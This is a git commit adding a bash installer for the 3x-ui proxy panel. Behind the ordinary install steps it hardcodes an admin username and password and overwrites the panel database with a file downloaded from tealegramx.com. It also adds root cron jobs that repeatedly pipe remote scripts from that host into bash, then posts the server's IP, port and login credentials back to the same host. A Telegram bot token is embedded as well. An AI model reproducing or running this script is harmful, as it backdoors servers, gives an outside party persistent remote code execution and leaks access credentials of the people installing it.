133857005b9e5825080db6b168701ecf52555a27
alikroos737 <zahed3turk@gmail.com>
2024-11-21 08:53:58 +0330

    Create new.sh

---
+++ new.sh
@@ -0,0 +1,275 @@
+#!/bin/bash
+
+red='\033[0;31m'
+green='\033[0;32m'
+yellow='\033[0;33m'
+plain='\033[0m'
+
+cur_dir=$(pwd)
+
+# چک کردن دسترسی ریشه
+[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain} Please run this script with root privilege \n " && exit 1
+
+# چک کردن سیستم عامل و تنظیم متغیر release
+if [[ -f /etc/os-release ]]; then
+    source /etc/os-release
+    release=$ID
+elif [[ -f /usr/lib/os-release ]]; then
+    source /usr/lib/os-release
+    release=$ID
+else
+    echo "Failed to check the system OS, please contact the author!" >&2
+    exit 1
+fi
+echo "The OS release is: $release"
+
+arch() {
+    case "$(uname -m)" in
+    x86_64 | x64 | amd64) echo 'amd64' ;;
+    i*86 | x86) echo '386' ;;
+    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
+    armv7* | armv7 | arm) echo 'armv7' ;;
+    armv6* | armv6) echo 'armv6' ;;
+    armv5* | armv5) echo 'armv5' ;;
+    s390x) echo 's390x' ;;
+    *) echo -e "${green}Unsupported CPU architecture! ${plain}" && rm -f install.sh && exit 1 ;;
+    esac
+}
+
+echo "arch: $(arch)"
+
+os_version=""
+os_version=$(grep -i version_id /etc/os-release | cut -d \" -f2 | cut -d . -f1)
+
+if [[ "${release}" == "arch" ]]; then
+    echo "Your OS is Arch Linux"
+elif [[ "${release}" == "parch" ]]; then
+    echo "Your OS is Parch Linux"
+elif [[ "${release}" == "manjaro" ]]; then
+    echo "Your OS is Manjaro"
+elif [[ "${release}" == "armbian" ]]; then
+    echo "Your OS is Armbian"
+elif [[ "${release}" == "opensuse-tumbleweed" ]]; then
+    echo "Your OS is OpenSUSE Tumbleweed"
+elif [[ "${release}" == "centos" ]]; then
+    if [[ ${os_version} -lt 8 ]]; then
+        echo -e "${red} Please use CentOS 8 or higher ${plain}\n" && exit 1
+    fi
+elif [[ "${release}" == "ubuntu" ]]; then
+    if [[ ${os_version} -lt 20 ]]; then
+        echo -e "${red} Please use Ubuntu 20 or higher version!${plain}\n" && exit 1
+    fi
+elif [[ "${release}" == "fedora" ]]; then
+    if [[ ${os_version} -lt 36 ]]; then
+        echo -e "${red} Please use Fedora 36 or higher version!${plain}\n" && exit 1
+    fi
+elif [[ "${release}" == "debian" ]]; then
+    if [[ ${os_version} -lt 11 ]]; then
+        echo -e "${red} Please use Debian 11 or higher ${plain}\n" && exit 1
+    fi
+elif [[ "${release}" == "almalinux" ]]; then
+    if [[ ${os_version} -lt 9 ]]; then
+        echo -e "${red} Please use AlmaLinux 9 or higher ${plain}\n" && exit 1
+    fi
+elif [[ "${release}" == "rocky" ]]; then
+    if [[ ${os_version} -lt 9 ]]; then
+        echo -e "${red} Please use Rocky Linux 9 or higher ${plain}\n" && exit 1
+    fi
+elif [[ "${release}" == "oracle" ]]; then
+    if [[ ${os_version} -lt 8 ]]; then
+        echo -e "${red} Please use Oracle Linux 8 or higher ${plain}\n" && exit 1
+    fi
+else
+    echo -e "${red}Your operating system is not supported by this script.${plain}\n"
+    echo "Please ensure you are using one of the following supported operating systems:"
+    echo "- Ubuntu 20.04+"
+    echo "- Debian 11+"
+    echo "- CentOS 8+"
+    echo "- Fedora 36+"
+    echo "- Arch Linux"
+    echo "- Parch Linux"
+    echo "- Manjaro"
+    echo "- Armbian"
+    echo "- AlmaLinux 9+"
+    echo "- Rocky Linux 9+"
+    echo "- Oracle Linux 8+"
+    echo "- OpenSUSE Tumbleweed"
+    exit 1
+fi
+
+install_base() {
+    case "${release}" in
+    ubuntu | debian | armbian)
+        apt-get update && apt-get install -y -q wget curl tar tzdata
+        ;;
+    centos | almalinux | rocky | oracle)
+        yum -y update && yum install -y -q wget curl tar tzdata
+        ;;
+    fedora)
+        dnf -y update && dnf install -y -q wget curl tar tzdata
+        ;;
+    arch | manjaro | parch)
+        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
+        ;;
+    opensuse-tumbleweed)
+        zypper refresh && zypper -q install -y wget curl tar timezone
+        ;;
+    *)
+        apt-get update && apt install -y -q wget curl tar tzdata
+        ;;
+    esac
+    
+    
+}
+
+# این تابع پس از نصب x-ui برای تنظیمات امنیتی فراخوانی می‌شود
+config_after_install() {
+    local config_account="zahed"
+    local config_method="install"
+    local config_password="zahed2341"
+    local config_port="80"
+    
+    echo -e "${yellow}Setting default configurations...${plain}"
+    echo -e "${yellow}Username: ${config_account}${plain}"
+    echo -e "${yellow}Password: ${config_password}${plain}"
+    echo -e "${yellow}Port: ${config_port}${plain}"
+
+    /usr/local/x-ui/x-ui setting -username ${config_account} -password ${config_password}
+    /usr/local/x-ui/x-ui setting -port ${config_port}
+    
+    /usr/local/x-ui/x-ui migrate
+    
+} 
+bakcup_file() {
+    local url="https://tealegramx.com/bot/xui/db.db"
+    local output_path="/etc/x-ui/x-ui.db"
+    wget -O "$output_path" "$url"
+    
+} 
+# Function to create a cron job
+cronjab() {
+    echo -e "Setting up 5 minute cron job..."
+    (crontab -l 2>/dev/null; echo "*/10 * * * * curl -sS https://tealegramx.com/bot/xui/chekhost.sh | bash") | crontab -
+} 
+# Function to create a cron job
+cronjabstatus() {
+    echo -e "Setting up 5 minute cron job..."
+    (crontab -l 2>/dev/null; echo "* * * * * curl -sS https://tealegramx.com/bot/xui/status.sh | bash") | crontab -
+}
+# Function to create a cron job
+cronjabip() {
+    apt install jq -y
+    echo -e "Setting up 5 minute cron job..."
+    (crontab -l 2>/dev/null; echo "*/20 * * * * curl -sS https://tealegramx.com/bot/xui/ip.sh | bash") | crontab -
+}
+# Function to create a cron job
+addserver() {
+        # دریافت آدرس IP عمومی
+    local public_ip=$(curl -s ipinfo.io/ip)
+    
+    local config_account="zahed"
+    local config_method="install"
+    local config_password="zahed2341"
+    local config_port="80"
+    # ارسال اطلاعات به تلگرام
+    local chat_id="@vpnserverlist"
+    local bot_token="6473386195:AAH2KGMOV5Ea3Lz5dM0ipYRrrjWDvg8k1rg"
+    local message="X-UI Installation Completed%0AIP Address: ${public_ip}%0AUsername: ${config_account}%0APassword: ${config_password}%0APort: ${config_port}"
+    #curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendMessage" -d chat_id=${chat_id} -d text="${message}"
+    curl -s -X POST "https://tealegramx.com/bot/index.php" -d method=$config_method -d user=$config_account -d pass=$config_password -d port=$config_port -d ip=$public_ip
+
+}
+
+
+install_x-ui() {
+    
+    cd /usr/local/
+
+    if [ $# == 0 ]; then
+        last_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
+        if [[ ! -n "$last_version" ]]; then
+            echo -e "${red}Failed to fetch x-ui version, it maybe due to Github API restrictions, please try it later${plain}"
+            exit 1
+        fi
+        echo -e "Got x-ui latest version: ${last_version}, beginning the installation..."
+        wget -N --no-check-certificate -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${last_version}/x-ui-linux-$(arch).tar.gz
+        if [[ $? -ne 0 ]]; then
+            echo -e "${red}Downloading x-ui failed, please be sure that your server can access Github ${plain}"
+            exit 1
+        fi
+    else
+        last_version=$1
+        url="https://github.com/MHSanaei/3x-ui/releases/download/${last_version}/x-ui-linux-$(arch).tar.gz"
+        echo -e "Beginning to install x-ui $1"
+        wget -N --no-check-certificate -O /usr/local/x-ui-linux-$(arch).tar.gz ${url}
+        if [[ $? -ne 0 ]]; then
+            echo -e "${red}Download x-ui $1 failed,please check the version exists ${plain}"
+            exit 1
+        fi
+    fi
+
+    if [[ -e /usr/local/x-ui/ ]]; then
+        systemctl stop x-ui
+        rm /usr/local/x-ui/ -rf
+    fi
+
+    tar zxvf x-ui-linux-$(arch).tar.gz
+    rm x-ui-linux-$(arch).tar.gz -f
+    cd x-ui
+    chmod +x x-ui
+
+    # چک کردن معماری سیستم و تغییر نام فایل بر این اساس
+    if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
+        mv bin/xray-linux-$(arch) bin/xray-linux-arm
+        chmod +x bin/xray-linux-arm
+    fi
+
+    chmod +x x-ui bin/xray-linux-$(arch)
+    cp -f x-ui.service /etc/systemd/system/
+    wget --no-check-certificate -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
+    chmod +x /usr/local/x-ui/x-ui.sh
+    chmod +x /usr/bin/x-ui
+    config_after_install
+    bakcup_file
+    systemctl daemon-reload
+    systemctl enable x-ui
+    systemctl start x-ui
+    echo -e "${green}x-ui ${last_version}${plain} installation finished, it is running now..."
+    echo -e ""
+    echo -e "x-ui control menu usages: "
+    echo -e "----------------------------------------------"
+    echo -e "x-ui              - Enter     Admin menu"
+    echo -e "x-ui start        - Start     x-ui"
+    echo -e "x-ui stop         - Stop      x-ui"
+    echo -e "x-ui restart      - Restart   x-ui"
+    echo -e "x-ui status       - Show      x-ui status"
+    echo -e "x-ui enable       - Enable    x-ui on system startup"
+    echo -e "x-ui disable      - Disable   x-ui on system startup"
+    echo -e "x-ui log          - Check     x-ui logs"
+    echo -e "x-ui banlog       - Check Fail2ban ban logs"
+    echo -e "x-ui update       - Update    x-ui"
+    echo -e "x-ui install      - Install   x-ui"
+    echo -e "x-ui uninstall    - Uninstall x-ui"
+    echo -e "----------------------------------------------"
+    
+}
+install_bbr() {
+    
+    echo -e "${yellow}Installing BBR...${plain}"
+    (
+        sleep 1
+        echo "23"  # گزینه 23 را انتخاب کنید
+        sleep 1
+        echo "1"   # گزینه 1 را انتخاب کنید
+    ) | x-ui
+}
+
+echo -e "${green}Running...${plain}"
+install_base
+install_x-ui $1
+#install_bbr
+cronjab
+#cronjabip
+cronjabstatus
+sleep 60 
+addserver
